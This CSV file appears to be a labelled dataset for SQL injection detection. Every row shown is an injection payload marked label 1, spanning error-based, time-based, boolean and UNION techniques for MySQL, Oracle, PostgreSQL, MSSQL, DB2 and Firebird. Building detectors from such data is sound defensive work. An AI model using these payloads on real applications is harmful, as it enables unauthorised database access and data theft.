payload,length,label
"1') and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",174,1
-7242' or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'kfff'='kfff,254,1
"1') or 8466=benchmark(5000000,md5(0x694a4745)) and ('osov' like 'osov",69,1
"1"" or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))",104,1
"1"")) union all select null,null,null,null,null,null#",52,1
1'+(select 'rpds' where 5870=5870 and 4595=4595#,48,1
"-4692%"")) union all select 1781,1781#",37,1
"1' and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))",63,1
"1"")) as klie where 2840=2840 or 8514=benchmark(5000000,md5(0x544d5a4c))#",72,1
"-4056""))) union all select 4363,4363,4363,4363,4363,4363,4363,4363#",67,1
"1') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",158,1
"1"" and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)",234,1
-7951'))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('blak'='blak,209,1
-7231)) union all select 7639#,30,1
"1%"") union all select null#",27,1
"1%"") union all select null,null,null,null,null,null,null,null,null#",67,1
"1"" and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ""oyuj""=""oyuj",122,1
"1' where 3362=3362;iif(5257=5257,1,1/0)",39,1
"1""))) union all select null#",28,1
"1' where 2202=2202 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",171,1
"-6600') union all select 5566,5566#",35,1
"-5145' where 2334=2334 union all select 2334,2334,2334,2334--",61,1
1'+(select ggah where 3263=3263 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq'))+',128,1
"1' and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and 'bxjo' like 'bxjo",125,1
"1))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((4858=4858",81,1
1') and 7533=7533 and ('dbjq'='dbjq,35,1
"1 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)# mafe",137,1
"1)) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((9313=9313",215,1
"1))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (((6578=6578",96,1
1 where 7021=7021 or 6793=(select 6793 from pg_sleep(5))--,58,1
"1)))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (((3950=3950",218,1
"1') as idqc where 5288=5288 and elt(1210=1210,sleep(5))--",57,1
"-5235) or make_set(9354=9354,7185)",34,1
"1'))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((('zxrb'='zxrb",227,1
"1' where 8869=8869 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",94,1
1 and 7533=7533,15,1
"1) and make_set(8403=8403,8899)",31,1
"1%""))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (((""%""=""",94,1
1%'))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('%'=',251,1
"1)) as zkrr where 4730=4730 or 8466=benchmark(5000000,md5(0x694a4745))--",72,1
"1"" and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)",110,1
-6109 union all select 6784--,29,1
"-5227"" union all select 2666--",30,1
"1'+(select xwcl where 7997=7997;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",116,1
"1) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",100,1
"1) as zelk where 1944=1944 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",168,1
"1%"")) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",146,1
1))) or sleep(5) and (((2209=2209,33,1
"1' in boolean mode);call regexp_substring(repeat(right(char(2385),0),500000000),null)--",87,1
"1%"";waitfor delay '0:0:5' and ""%""=""",35,1
"1%') or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",142,1
"1"") or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (""igop""=""igop",112,1
"1"" where 3274=3274 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",190,1
"1"")));waitfor delay '0:0:5'--",29,1
"1') union all select null,null,null,null#",41,1
"-3230"")) as kbxc where 5007=5007 or 2107=8818",45,1
1') waitfor delay '0:0:5' and ('fpnh'='fpnh,43,1
"1%' union all select null,null,null,null,null,null,null,null,null--",67,1
1%') and 6969=(select 6969 from pg_sleep(5)) and ('%'=',55,1
"1'))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('hryb'='hryb",131,1
"1'))) or 8156=(select count(*) from generate_series(1,5000000))--",65,1
"1;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",69,1
"1"") as hfgk where 1100=1100 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",136,1
"1'+(select bptu where 7356=7356 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))))+'",232,1
1' in boolean mode) union all select null--,43,1
"1"" where 9829=9829 order by 1#",30,1
"1') as elnu where 5719=5719 or 8156=(select count(*) from generate_series(1,5000000))--",87,1
1) where 1402=1402;select sleep(5)#,35,1
"1') as nmzp where 3794=3794 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",180,1
"-1525'))) union all select 4110,4110,4110,4110,4110,4110#",57,1
"1);select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (3770=3770",100,1
"1') where 7887=7887 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",113,1
"1"" and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""mbas""=""mbas",206,1
-1468'))) or 4875=6163#,23,1
"-9572%"") or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""%""=""",214,1
"-9451%"") union all select 9963,9963,9963--",42,1
1') and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('svhx'='svhx,202,1
"1"");begin user_lock.sleep(5); end--",35,1
-8099%')) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('%'=',223,1
"-1164"") union all select 6617,6617,6617,6617,6617,6617--",56,1
1) order by 1--,15,1
"1') where 6489=6489 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",112,1
1 where 6827=6827;select case when 7717=7717 then 1 else null end--,67,1
"1%""))) and (3502=7893)*7893 and (((""%""=""",40,1
"1') and make_set(8403=8403,8899) and ('kyxl'='kyxl",50,1
"-2979')) as klou where 7092=7092 union all select 7092,7092--",61,1
"-8448%"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""%""=""",219,1
"1"" union all select null--",26,1
"-1620)) union all select 6257,6257,6257,6257,6257,6257,6257,6257,6257,6257--",76,1
"-2319 union all select 5068,5068,5068#",38,1
"1"" or elt(6272=6272,sleep(5))",29,1
"1""));select pg_sleep(5)--",25,1
"1' where 1085=1085 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",120,1
-3304')) order by 1--,21,1
"1""))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""adwg"" like ""adwg",135,1
"1%"")) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",112,1
"1%"") union all select null,null,null,null,null#",47,1
1') where 8776=8776 and 6969=(select 6969 from pg_sleep(5))--,61,1
"-8546' union all select 4729,4729,4729,4729,4729,4729,4729,4729,4729#",69,1
"1%"")) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""%""=""",188,1
-3862') or 9323=9323#,21,1
"-8425"")) or (6485=1127)*1127 and ((""qruf""=""qruf",47,1
1');select pg_sleep(5)--,24,1
"-2106"" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""dvlq"" like ""dvlq",226,1
"1%') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ('%'='",217,1
"1"") as gdcx where 2335=2335 and 6969=(select 6969 from pg_sleep(5))--",69,1
"1) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",102,1
"1' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'tmwy'='tmwy",175,1
"1') and 8635=(select count(*) from generate_series(1,5000000))--",64,1
"1'))) union all select null,null,null,null,null,null,null,null,null,null--",74,1
1 rlike (select * from (select(sleep(5)))sgvo)# ewsz,52,1
"1""))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (((""text"" like ""text",90,1
"-8203)) as eqlf where 6132=6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132,6132--",95,1
"1') where 9304=9304 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",81,1
"1 where 8398=8398;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",114,1
1 where 5161=5161 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,251,1
1%') and 2006=2006,18,1
"1' where 1628=1628 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",171,1
"1) as qjbd where 2808=2808 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",215,1
"1"");select (case when (2676=4191) then 2676 else 1/(select 0) end)--",68,1
"1')) or elt(6272=6272,sleep(5)) and (('zjel' like 'zjel",55,1
1')) as txxn where 7884=7884 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,211,1
"1') as wtfo where 5666=5666 union all select null,null,null,null--",66,1
-5299 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),185,1
1 where 8532=8532;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,82,1
1') where 9538=9538;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,113,1
"1%')));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",91,1
"1""))) or sleep(5)#",18,1
"1"" or 8466=benchmark(5000000,md5(0x694a4745)) and ""vnei"" like ""vnei",67,1
"1"")) as ylah where 9248=9248;select pg_sleep(5)--",49,1
-3834')) as hhiy where 2086=2086 or 3038=3038,45,1
"-4236') union all select 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#",75,1
-2241) where 7606=7606 or (8459=8459)*4906--,44,1
1')) as wqhm where 9871=9871;(select * from (select(sleep(5)))srmq)--,69,1
1)) as rcbz where 4563=4563 and 2006=2006,41,1
"-1947 union all select 7780,7780,7780,7780,7780,7780,7780,7780#",63,1
-1459'))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((('eiet' like 'eiet,127,1
"1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'xqkq'='xqkq",112,1
1');if(7899=7899) select 7899 else drop function zbbp--,55,1
"1"");call regexp_substring(repeat(right(char(3702),0),500000000),null) and (""cwat"" like ""cwat",92,1
"1"" or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""zyoo""=""zyoo",159,1
"1 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",140,1
"-9762) or elt(5773=8986,8986)",29,1
"-8773%'))) union all select 8941,8941,8941,8941,8941,8941#",58,1
"-4233%"") or (8459=8459)*4906 and (""%""=""",39,1
1'||(select 'ptfi' from dual where 2234=2234 and 2006=2006,58,1
"1%""))) union all select null,null,null,null,null,null--",55,1
"1') union all select null,null,null,null,null,null#",51,1
"1""))) or elt(6272=6272,sleep(5)) and (((""hxgu""=""hxgu",52,1
"1))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",112,1
"1 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))-- huss",206,1
1') where 6305=6305 rlike (select (case when (8326=9749) then 1 else 0x28 end))--,81,1
1'))) rlike sleep(5) and ((('zwyx'='zwyx,40,1
"1')) as jpxj where 6153=6153 or 8156=(select count(*) from generate_series(1,5000000))--",88,1
"1""))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",113,1
"1"" and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ""mezx"" like ""mezx",226,1
"1"" and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""wtkx""=""wtkx",170,1
"-6112"") union all select 8203,8203,8203,8203,8203,8203,8203--",61,1
"1"") as tqxa where 6751=6751 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",184,1
1'));waitfor delay '0:0:5'--,28,1
"-5391 or make_set(9354=9354,7185)# ptyy",39,1
"1%';select benchmark(5000000,md5(0x4c4d6142)) and '%'='",55,1
"1')) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (('ocfi'='ocfi",115,1
"1) union all select null,null,null,null,null,null,null#",55,1
"1%'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('%'='",112,1
"1') where 8211=8211 union all select null,null,null,null,null#",62,1
"1)) as ehlg where 6340=6340;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",112,1
"1))) and 8635=(select count(*) from generate_series(1,5000000))--",65,1
-3899') where 8152=8152 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,211,1
"-6662"")) union all select 6755--",32,1
